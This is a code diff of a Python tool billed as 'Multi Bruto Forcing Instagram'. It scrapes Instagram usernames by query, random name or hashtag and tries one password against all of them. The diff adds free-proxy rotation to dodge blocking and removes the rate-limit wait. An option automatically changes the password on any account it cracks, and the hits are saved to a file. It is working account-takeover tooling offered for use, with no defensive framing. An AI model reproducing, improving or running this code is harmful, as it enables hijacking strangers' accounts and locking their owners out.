@@ -1,8 +1,12 @@
 #Xractz - IndoSec
-#NOT FOR SALE!
-#If you want to recode please provide the origin or tools owner!
-
-import requests, random, pickle, json, time, sys, os, re
+import re
+import os
+import sys
+import json
+import time
+import random
+import pickle
+import requests
 from concurrent.futures import ThreadPoolExecutor
 
 
@@ -56,20 +60,20 @@ def Bypass():
 	ua = random.choice(ua)
 	ua = ua.replace("\n", "")
 
-	# proxy = requests.get("https://free-proxy-list.net/").text
-	# proxy = re.findall(r"<tr><td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+?)</td>", proxy)
+	proxy = requests.get("https://free-proxy-list.net/").text
+	proxy = re.findall(r"<tr><td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+?)</td>", proxy)
 
-	# proxies = []
-	# for x in proxy:
-	# 	proxies.append(":".join(x))
-	# proxy = random.choice(proxies)
-	# proxies = {'http':f"{proxy}",'https':proxy}
-
-	return ua
+	proxies = []
+	for x in proxy:
+		proxies.append(":".join(x))
+	proxy = random.choice(proxies)
+	proxies = {"http":f"http://{proxy}", "https":f"https://{proxy}"}
+	
+	return ua, proxies
 
 
 def searchQuery(username):
-	ua = Bypass()
+	ua, proxies = Bypass()
 	headers = {"User-Agent":ua}
 	data = requests.get(f"https://www.instagram.com/web/search/topsearch/?context=blended&query={username}", headers=headers).text
 	data = json.loads(data)
@@ -85,7 +89,7 @@ def searchQuery(username):
 
 
 def randomSearch(count):
-	ua = Bypass()
+	ua, proxies = Bypass()
 	headers = {"User-Agent":ua}
 	users = {}
 	jumlah = 0
@@ -109,7 +113,7 @@ def getUserPost(id):
 	return usr
 
 def searchTags(tags):
-	ua = Bypass()
+	ua, proxies = Bypass()
 	headers = {"User-Agent":ua}
 	url = f"https://www.instagram.com/explore/tags/{tags}/?_a=1"
 	ids = requests.get(url, headers=headers).text
@@ -129,7 +133,7 @@ def searchTags(tags):
 
 
 def changePassword(username, password, np):
-	ua = Bypass()
+	ua, proxies = Bypass()
 
 	url = "https://www.instagram.com/"
 	cookie = loadCookie(username)
@@ -160,17 +164,17 @@ def changePassword(username, password, np):
 
 
 def checkFoll(username):
-	ua = Bypass()
+	ua, proxies = Bypass()
 	headers = {"User-Agent":ua}
 	url = f"https://www.instagram.com/{username}/"
-	foll = requests.get(url).text
+	foll = requests.get(url, headers=headers).text
 	foll = re.findall(r"\"edge_followed_by\"\:\{\"count\"\:(\d+)\}", foll)[0]
 
 	return foll
 
 
 def loginInstagram(username, password):
-	ua = Bypass()
+	ua, proxies = Bypass()
 	s = requests.Session()
 	url = "https://www.instagram.com/accounts/login/"
 	url_log = url + "ajax/"
@@ -183,8 +187,11 @@ def loginInstagram(username, password):
 	"username":username,
 	"password":password,
 	}
+	try:
+		login = s.post(url_log, headers=headers, data=data)
+	except:
+		pass
 
-	login = s.post(url_log, headers=headers, data=data)
 	cookie = login.cookies
 	result = login.text
 
@@ -203,13 +210,13 @@ def bfInstagram(users, password, command, newpassword):
 			try:
 				login = re.findall(r"\"authenticated\"\: (.*?)\,", result)[0]
 			except IndexError:
-				print(f"[{R + B}!{C}]Please wait a few minutes before you try again.")
-				t = 600
-				while t:
-					minu, sec = divmod(t, 60)
-					print(f"[{R + B}!{C}]Restarting from {minu}:{sec}", end="\r")
-					time.sleep(1)
-					t -= 1
+				print(f"[{R + B}!{C}](LIMIT)Please wait a few minutes before you try again.")
+				# t = 600
+				# while t:
+				# 	minu, sec = divmod(t, 60)
+				# 	print(f"[{R + B}!{C}]Restarting from {minu}:{sec}", end="\r")
+				# 	time.sleep(1)
+				# 	t -= 1
 				continue
 
 			if login == 'false':
@@ -249,315 +256,317 @@ def bfInstagram(users, password, command, newpassword):
 	return result
 
 
-if __name__ == "__main__":
-	try:
-		os.system('clear')
+def main():
+	os.system('clear')
 
-		if os.path.isdir("tmp") == True:
-			os.system('rm -rf tmp')
-		else:
-			os.mkdir("tmp")
+	if os.path.isdir("tmp") == True:
+		os.system('rm -rf tmp')
+	else:
+		os.mkdir("tmp")
 
-		CLR = ["\033[31;1m", "\033[32;1m", "\033[33;1m", "\033[34;1m", "\033[35;1m", "\033[36;1m"]
-		rdm = random.choice(CLR)
+	CLR = ["\033[31;1m", "\033[32;1m", "\033[33;1m", "\033[34;1m", "\033[35;1m", "\033[36;1m"]
+	rdm = random.choice(CLR)
 
-		banner = f'''
+	banner = f'''
 {rdm} __  __ ___ ___ 
 {rdm}|  \/  | _ )_ _| {W + B}| MBI
 {rdm}| |\/| | _ \| |  {W + B}| Multi Bruto Forcing Instagram
 {rdm}|_|  |_|___/___| {W + B}| Coded by Xractz - {R + D}Indo{W + B}Sec{C}                
-		'''
+	'''
+	print(banner)
+	print("1. Search username by query")
+	print("2. Search username by multipel query")
+	print("3. Search username by random name")
+	print("4. Search username by #hastag")
+	print("5. Search username by multipel #hastag")
+	print("6. Contact Owner")
+	print("0. EXIT")
+
+	cmd = input("\n>>> ")
+	key = ["0","1","2","3","4","5","6"]
+	while cmd not in key:
+		cmd = input(">>> ")
+
+	if cmd == "0":
+		print()
+		t = 3
+		while t:
+			print(f"Exiting from {t}s", end="\r")
+			time.sleep(1)
+			t -= 1
+		os.system('rm -rf tmp')
+		os.system("clear")
+		sys.exit()
+
+	if cmd == "1":
+		os.system('clear')
 		print(banner)
-		print("1. Search username by query")
-		print("2. Search username by multipel query")
-		print("3. Search username by random name")
-		print("4. Search username by #hastag")
-		print("5. Search username by multipel #hastag")
-		print("6. Contact Owner")
-		print("0. EXIT")
+		username = input(f"[{Y + B}?{C}]Query    : ")
 
-		cmd = input("\n>>> ")
-		key = ["0","1","2","3","4","5","6"]
-		while cmd not in key:
-			cmd = input(">>> ")
-
-		if cmd == "0":
-			print()
-			t = 3
-			while t:
-				print(f"Exiting from {t}s", end="\r")
-				time.sleep(1)
-				t -= 1
-			os.system('rm -rf tmp')
-			os.system("clear")
-			sys.exit()
-
-		if cmd == "1":
+		while username == "":
+			print(f"[{R + B}!{C}]Status   : Please don't be empty")
+			time.sleep(2)
 			os.system('clear')
 			print(banner)
 			username = input(f"[{Y + B}?{C}]Query    : ")
+		print(f"[{G + B}+{C}]Status   : Grabbing please wait")
 
-			while username == "":
-				print(f"[{R + B}!{C}]Status   : Please don't be empty")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				username = input(f"[{Y + B}?{C}]Query    : ")
-			print(f"[{G + B}+{C}]Status   : Grabbing please wait")
+		usr, jml = searchQuery(username)
+		print(f"[{G + B}+{C}]Geted    : {G + B}{jml}{C} username")
+		passwd = input(f"[{Y + B}?{C}]Password : ")
 
-			usr, jml = searchQuery(username)
-			print(f"[{G + B}+{C}]Geted    : {G + B}{jml}{C} username")
+		while passwd == "" or len(passwd) < 8:
 			passwd = input(f"[{Y + B}?{C}]Password : ")
 
-			while passwd == "" or len(passwd) < 8:
-				passwd = input(f"[{Y + B}?{C}]Password : ")
-
+		cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+		while cmd == "":
 			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-			while cmd == "":
-				cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
 
-			if cmd.lower() == "y":
+		if cmd.lower() == "y":
+			cpw = input(f"[{Y + B}?{C}]New Password : ")
+			while cpw == "" or len(cpw) < 8:
 				cpw = input(f"[{Y + B}?{C}]New Password : ")
-				while cpw == "" or len(cpw) < 8:
-					cpw = input(f"[{Y + B}?{C}]New Password : ")
 
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
 
-				result = bfInstagram(usr, passwd, cmd, cpw)
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+			result = bfInstagram(usr, passwd, cmd, cpw)
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
 
-			elif cmd.lower() == "n":
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(usr, passwd, cmd, "")
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+		elif cmd.lower() == "n":
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			result = bfInstagram(usr, passwd, cmd, "")
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
-			
-		elif cmd == "2":
+		
+	elif cmd == "2":
+		os.system('clear')
+		print(banner)
+		print(f"[{R + B}!{C}]Use comma to multipel query (ex: name,name2)")
+		username = input(f"[{Y + B}?{C}]Query    : ")
+
+		while username == "":
+			print(f"[{R + B}!{C}]Status   : Please don't be empty")
+			time.sleep(2)
 			os.system('clear')
 			print(banner)
-			print(f"[{R + B}!{C}]Use comma to multipel query (ex: name,name2)")
 			username = input(f"[{Y + B}?{C}]Query    : ")
+		print(f"[{G + B}+{C}]Status   : Grabbing please wait")
+		
+		usr = username.split(",")
+		final = []
+		jumlah = 0
 
-			while username == "":
-				print(f"[{R + B}!{C}]Status   : Please don't be empty")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				username = input(f"[{Y + B}?{C}]Query    : ")
-			print(f"[{G + B}+{C}]Status   : Grabbing please wait")
+		with ThreadPoolExecutor(max_workers=2) as e:
+			futures = []
+			for username in usr:
+				futures.append(e.submit(searchQuery, username))
+			for i, future in enumerate(futures):
+				usr, jml = future.result()
+				final += usr
+				jumlah += jml
 			
-			usr = username.split(",")
-			final = []
-			jumlah = 0
+		print(f"[{R + B}!{C}]Geted    : {jumlah} username")
 
-			with ThreadPoolExecutor(max_workers=2) as e:
-				futures = []
-				for username in usr:
-					futures.append(e.submit(searchQuery, username))
-				for i, future in enumerate(futures):
-					usr, jml = future.result()
-					final += usr
-					jumlah += jml
-				
-			print(f"[{R + B}!{C}]Geted    : {jumlah} username")
-
+		passwd = input(f"[{Y + B}?{C}]Password : ")
+		while passwd == "" or len(passwd) < 8:
 			passwd = input(f"[{Y + B}?{C}]Password : ")
-			while passwd == "" or len(passwd) < 8:
-				passwd = input(f"[{Y + B}?{C}]Password : ")
 
+		cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+		while cmd == "":
 			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-			while cmd == "":
-				cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
 
-			if cmd.lower() == "y":
+		if cmd.lower() == "y":
+			cpw = input(f"[{Y + B}?{C}]New Password : ")
+			while cpw == "" or len(cpw) < 8:
 				cpw = input(f"[{Y + B}?{C}]New Password : ")
-				while cpw == "" or len(cpw) < 8:
-					cpw = input(f"[{Y + B}?{C}]New Password : ")
 
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
 
-				result = bfInstagram(final, passwd, cmd, cpw)
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+			result = bfInstagram(final, passwd, cmd, cpw)
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
-			elif cmd.lower() == "n":
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(final, passwd, cmd, "")
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+		elif cmd.lower() == "n":
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			result = bfInstagram(final, passwd, cmd, "")
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
-			
-		elif cmd == "3":
+		
+	elif cmd == "3":
+		os.system('clear')
+		print(banner)
+		count = input(f"[{Y + B}?{C}]Count    : ")
+
+		while count.isdigit() == False:
+			print(f"[{R + B}!{C}]Status   : Please enter a valid number")
+			time.sleep(2)
 			os.system('clear')
 			print(banner)
 			count = input(f"[{Y + B}?{C}]Count    : ")
+		print(f"[{G + B}+{C}]Status   : Grabbing please wait")
 
-			while count.isdigit() == False:
-				print(f"[{R + B}!{C}]Status   : Please enter a valid number")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				count = input(f"[{Y + B}?{C}]Count    : ")
-			print(f"[{G + B}+{C}]Status   : Grabbing please wait")
+		final = []
+		users, jumlah = randomSearch(int(count))
+		for username, user in users.items():
+			for usr in user:
+				final.append(usr)
+		print(f"[{R + B}!{C}]Geted    : {jumlah} username")
+		passwd = input(f"[{Y + B}?{C}]Password : ")
 
-			final = []
-			users, jumlah = randomSearch(int(count))
-			for username, user in users.items():
-				for usr in user:
-					final.append(usr)
-			print(f"[{R + B}!{C}]Geted    : {jumlah} username")
+		while passwd == "" or len(passwd) < 8:
 			passwd = input(f"[{Y + B}?{C}]Password : ")
 
-			while passwd == "" or len(passwd) < 8:
-				passwd = input(f"[{Y + B}?{C}]Password : ")
-
+		cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+		while cmd == "":
 			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-			while cmd == "":
-				cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
 
-			if cmd.lower() == "y":
+		if cmd.lower() == "y":
+			cpw = input(f"[{Y + B}?{C}]New Password : ")
+			while cpw == "" or len(cpw) < 8:
 				cpw = input(f"[{Y + B}?{C}]New Password : ")
-				while cpw == "" or len(cpw) < 8:
-					cpw = input(f"[{Y + B}?{C}]New Password : ")
 
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
 
-				result = bfInstagram(final, passwd, cmd, cpw)
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+			result = bfInstagram(final, passwd, cmd, cpw)
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
-			elif cmd.lower() == "n":
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(final, passwd, cmd, "")
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+		elif cmd.lower() == "n":
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			result = bfInstagram(final, passwd, cmd, "")
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
 
-		elif cmd == "4":
+	elif cmd == "4":
+		os.system('clear')
+		print(banner)
+		tags = input(f"[{Y + B}?{C}]Tags     : ")
+		tags = tags.replace("#", "")
+
+		while " " in tags:
+			print(f"[{R + B}!{C}]Status   : Please don't use space")
+			time.sleep(2)
 			os.system('clear')
 			print(banner)
 			tags = input(f"[{Y + B}?{C}]Tags     : ")
-			tags = tags.replace("#", "")
 
-			while " " in tags:
-				print(f"[{R + B}!{C}]Status   : Please don't use space")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				tags = input(f"[{Y + B}?{C}]Tags     : ")
-
-			while tags == "":
-				print(f"[{R + B}!{C}]Status   : Please don't be empty")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				tags = input(f"[{Y + B}?{C}]Tags     : ")
-			print(f"[{G + B}+{C}]Status   : Grabbing please wait")
-
-			usr, jml = searchTags(tags)
-			print(f"[{R + B}!{C}]Geted    : {jml} username")
-			passwd = input(f"[{Y + B}?{C}]Password : ")
-
-			while passwd == "" or len(passwd) < 8:
-				passwd = input(f"[{Y + B}?{C}]Password : ")
-
-			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-			while cmd == "":
-				cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-
-			if cmd.lower() == "y":
-				cpw = input(f"[{Y + B}?{C}]New Password : ")
-				while cpw == "" or len(cpw) < 8:
-					cpw = input(f"[{Y + B}?{C}]New Password : ")
-
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-
-				result = bfInstagram(usr, passwd, cmd, cpw)
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
-
-			elif cmd.lower() == "n":
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(final, passwd, cmd, "")
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
-
-
-		elif cmd == "5":
+		while tags == "":
+			print(f"[{R + B}!{C}]Status   : Please don't be empty")
+			time.sleep(2)
 			os.system('clear')
 			print(banner)
-			print(f"[{R + B}!{C}]Use comma to multipel query (ex: #tags,#tags2)")
 			tags = input(f"[{Y + B}?{C}]Tags     : ")
-			tags = tags.replace("#", "")
+		print(f"[{G + B}+{C}]Status   : Grabbing please wait")
 
-			while " " in tags:
-				print(f"[{R + B}!{C}]Status   : Please don't use space")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				tags = input(f"[{Y + B}?{C}]Tags     : ")
+		usr, jml = searchTags(tags)
+		print(f"[{R + B}!{C}]Geted    : {jml} username")
+		passwd = input(f"[{Y + B}?{C}]Password : ")
 
-			while tags == "":
-				print(f"[{R + B}!{C}]Status   : Please don't be empty")
-				time.sleep(2)
-				os.system('clear')
-				print(banner)
-				tags = input(f"[{Y + B}?{C}]Tags     : ")
-			print(f"[{G + B}+{C}]Status   : Grabbing please wait")
-
-			tags = tags.split(",")
-			final = []
-			jumlah = 0
-			for tag in tags:
-				usr, jml = searchTags(tag)
-				final += usr
-				jumlah += jml
-			print(f"[{R + B}!{C}]Geted    : {jumlah} username")
-
+		while passwd == "" or len(passwd) < 8:
 			passwd = input(f"[{Y + B}?{C}]Password : ")
-			while passwd == "" or len(passwd) < 8:
-				passwd = input(f"[{Y + B}?{C}]Password : ")
 
+		cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+		while cmd == "":
 			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
-			while cmd == "":
-				cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
 
-			if cmd.lower() == "y":
+		if cmd.lower() == "y":
+			cpw = input(f"[{Y + B}?{C}]New Password : ")
+			while cpw == "" or len(cpw) < 8:
 				cpw = input(f"[{Y + B}?{C}]New Password : ")
-				while cpw == "" or len(cpw) < 8:
-					cpw = input(f"[{Y + B}?{C}]New Password : ")
 
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
 
-				result = bfInstagram(final, passwd, cmd, cpw)
-				print(result)
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
+			result = bfInstagram(usr, passwd, cmd, cpw)
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
-			elif cmd.lower() == "n":
-				print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
-				result = bfInstagram(final, passwd, cmd, "")
-				print(f"[{G + B}+{C}]Saved on live.txt")
-				menu()
-
-
-		elif cmd == "6":
-			os.system("xdg-open https://t.me/Xractz")
-			os.system("clear")
-			sys.exit()
+		elif cmd.lower() == "n":
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			result = bfInstagram(final, passwd, cmd, "")
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
 
 
+	elif cmd == "5":
+		os.system('clear')
+		print(banner)
+		print(f"[{R + B}!{C}]Use comma to multipel query (ex: #tags,#tags2)")
+		tags = input(f"[{Y + B}?{C}]Tags     : ")
+		tags = tags.replace("#", "")
+
+		while " " in tags:
+			print(f"[{R + B}!{C}]Status   : Please don't use space")
+			time.sleep(2)
+			os.system('clear')
+			print(banner)
+			tags = input(f"[{Y + B}?{C}]Tags     : ")
+
+		while tags == "":
+			print(f"[{R + B}!{C}]Status   : Please don't be empty")
+			time.sleep(2)
+			os.system('clear')
+			print(banner)
+			tags = input(f"[{Y + B}?{C}]Tags     : ")
+		print(f"[{G + B}+{C}]Status   : Grabbing please wait")
+
+		tags = tags.split(",")
+		final = []
+		jumlah = 0
+		for tag in tags:
+			usr, jml = searchTags(tag)
+			final += usr
+			jumlah += jml
+		print(f"[{R + B}!{C}]Geted    : {jumlah} username")
+
+		passwd = input(f"[{Y + B}?{C}]Password : ")
+		while passwd == "" or len(passwd) < 8:
+			passwd = input(f"[{Y + B}?{C}]Password : ")
+
+		cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+		while cmd == "":
+			cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
+
+		if cmd.lower() == "y":
+			cpw = input(f"[{Y + B}?{C}]New Password : ")
+			while cpw == "" or len(cpw) < 8:
+				cpw = input(f"[{Y + B}?{C}]New Password : ")
+
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+
+			result = bfInstagram(final, passwd, cmd, cpw)
+			print(result)
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
+
+		elif cmd.lower() == "n":
+			print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
+			result = bfInstagram(final, passwd, cmd, "")
+			print(f"[{G + B}+{C}]Saved on live.txt")
+			menu()
+
+
+	elif cmd == "6":
+		os.system("xdg-open https://t.me/Xractz")
+		os.system("clear")
+		sys.exit()
+
+
+if __name__ == "__main__":
+	try:
+		main()
 	except(EOFError, KeyboardInterrupt):
 		print()
 		t = 3
